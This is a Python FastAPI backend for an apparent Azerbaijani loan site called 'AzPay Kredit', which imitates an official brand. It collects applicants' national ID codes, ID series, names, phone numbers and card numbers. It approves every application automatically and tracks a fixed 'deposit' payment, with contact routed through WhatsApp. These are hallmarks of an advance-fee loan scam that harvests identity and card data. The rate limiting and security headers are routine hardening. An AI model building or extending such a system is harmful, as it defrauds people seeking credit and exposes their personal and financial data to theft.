from fastapi import FastAPI, APIRouter, HTTPException, Request
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import Optional
import uuid
from datetime import datetime, timezone
import re
import time
from collections import defaultdict

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app
app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)  # Disable API docs

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Rate limiting storage
request_counts = defaultdict(list)
RATE_LIMIT = 30  # requests per minute
RATE_WINDOW = 60  # seconds

# Security Middleware
class SecurityMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # Get client IP
        forwarded = request.headers.get("x-forwarded-for")
        client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
        
        # Rate limiting
        now = time.time()
        request_counts[client_ip] = [t for t in request_counts[client_ip] if now - t < RATE_WINDOW]
        
        if len(request_counts[client_ip]) >= RATE_LIMIT:
            return JSONResponse(
                status_code=429,
                content={"detail": "Çox sayda sorğu. Zəhmət olmasa gözləyin."}
            )
        
        request_counts[client_ip].append(now)
        
        # Block suspicious paths
        blocked_paths = ['/admin', '/wp-admin', '/phpmyadmin', '/.env', '/config', '/.git']
        if any(request.url.path.lower().startswith(p) for p in blocked_paths):
            return JSONResponse(status_code=403, content={"detail": "Giriş qadağandır"})
        
        # Process request
        response = await call_next(request)
        
        # Add security headers
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Content-Security-Policy"] = "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'"
        response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
        
        return response

app.add_middleware(SecurityMiddleware)

# CORS middleware - restricted
ALLOWED_ORIGINS = [
    "https://azpayresmi.com",
    "https://www.azpayresmi.com",
    "https://azpay.online",
    "https://loan-fix-secure.preview.emergentagent.com"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT"],
    allow_headers=["Content-Type"],
)

# Define Models
class CreditApplication(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    fin_code: str
    id_series: str
    full_name: str
    phone: str
    selected_amount: Optional[int] = None
    card_number: Optional[str] = None
    contract_signed: bool = False
    deposit_paid: bool = False
    status: str = "pending"
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class CreditApplicationCreate(BaseModel):
    fin_code: str
    id_series: str
    full_name: str
    phone: str

class CreditApplicationUpdate(BaseModel):
    selected_amount: Optional[int] = None
    card_number: Optional[str] = None
    contract_signed: Optional[bool] = None
    deposit_paid: Optional[bool] = None
    status: Optional[str] = None

# Input validation
def sanitize_input(text: str) -> str:
    if not text:
        return text
    # Remove potentially dangerous characters
    text = re.sub(r'[<>"\';(){}]', '', text)
    return text[:500]  # Limit length

def validate_phone(phone: str) -> bool:
    return bool(re.match(r'^[\d\s\+\-()]{7,20}$', phone))

def validate_fin(fin: str) -> bool:
    return bool(re.match(r'^[A-Za-z0-9]{5,20}$', fin))

# Hardcoded Settings - IMMUTABLE
SITE_SETTINGS = {
    "id": "settings",
    "deposit_amount": 50.0,
    "whatsapp_link": "https://wa.me/994506490600",
    "whatsapp_message_enabled": True,
    "logo_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "hero_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "approval_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "credit_selection_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "card_entry_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "contract_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "contact_phone": "*",
    "contact_email": "info@azpay.az",
    "contact_address": "Bakı, Azərbaycan",
    "about_text": "AzPay Kredit müasir maliyyə həlləri təqdim edən etibarlı ödəniş və kredit platformasıdır."
}

# Hardcoded Credit Offers - IMMUTABLE
CREDIT_OFFERS = [
    {"amount": 1000, "duration_months": 12, "interest_rate": 10, "monthly_payment": 87.92},
    {"amount": 2000, "duration_months": 12, "interest_rate": 10, "monthly_payment": 175.83},
    {"amount": 3000, "duration_months": 18, "interest_rate": 10, "monthly_payment": 180.56},
    {"amount": 5000, "duration_months": 24, "interest_rate": 10, "monthly_payment": 230.72},
    {"amount": 7500, "duration_months": 24, "interest_rate": 10, "monthly_payment": 346.08},
    {"amount": 10000, "duration_months": 36, "interest_rate": 10, "monthly_payment": 322.67},
    {"amount": 15000, "duration_months": 36, "interest_rate": 10, "monthly_payment": 484.01}
]

@api_router.get("/")
async def root():
    return {"status": "ok"}

# Credit Application Routes - with validation
@api_router.post("/applications", response_model=CreditApplication)
async def create_application(input: CreditApplicationCreate):
    # Validate inputs
    if not validate_fin(input.fin_code):
        raise HTTPException(status_code=400, detail="Yanlış FIN kod formatı")
    if not validate_phone(input.phone):
        raise HTTPException(status_code=400, detail="Yanlış telefon formatı")
    
    # Sanitize inputs
    app_obj = CreditApplication(
        fin_code=sanitize_input(input.fin_code),
        id_series=sanitize_input(input.id_series),
        full_name=sanitize_input(input.full_name),
        phone=sanitize_input(input.phone),
        status="approved"
    )
    
    doc = app_obj.model_dump()
    doc['created_at'] = doc['created_at'].isoformat()
    
    await db.applications.insert_one(doc)
    return app_obj

@api_router.get("/applications/{app_id}")
async def get_application(app_id: str):
    # Validate UUID format
    if not re.match(r'^[a-f0-9\-]{36}$', app_id):
        raise HTTPException(status_code=400, detail="Yanlış ID formatı")
    
    app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    if not app:
        raise HTTPException(status_code=404, detail="Müraciət tapılmadı")
    return app

@api_router.put("/applications/{app_id}")
async def update_application(app_id: str, update: CreditApplicationUpdate):
    # Validate UUID format
    if not re.match(r'^[a-f0-9\-]{36}$', app_id):
        raise HTTPException(status_code=400, detail="Yanlış ID formatı")
    
    update_data = {k: v for k, v in update.model_dump().items() if v is not None}
    
    if not update_data:
        raise HTTPException(status_code=400, detail="Yeniləmə məlumatı yoxdur")
    
    # Sanitize string inputs
    if 'card_number' in update_data and update_data['card_number']:
        update_data['card_number'] = re.sub(r'[^\d\s]', '', update_data['card_number'])[:30]
    
    result = await db.applications.update_one(
        {"id": app_id},
        {"$set": update_data}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Müraciət tapılmadı")
    
    updated_app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    return updated_app

# Settings Route - Read Only (IMMUTABLE)
@api_router.get("/settings")
async def get_settings():
    return SITE_SETTINGS

# Block all other methods on settings
@api_router.post("/settings")
@api_router.put("/settings")
@api_router.delete("/settings")
@api_router.patch("/settings")
async def block_settings_modification():
    raise HTTPException(status_code=403, detail="Dəyişiklik qadağandır")

# Include the router in the main app
app.include_router(api_router)

# Catch-all for undefined routes
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
async def catch_all(path: str):
    raise HTTPException(status_code=404, detail="Səhifə tapılmadı")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
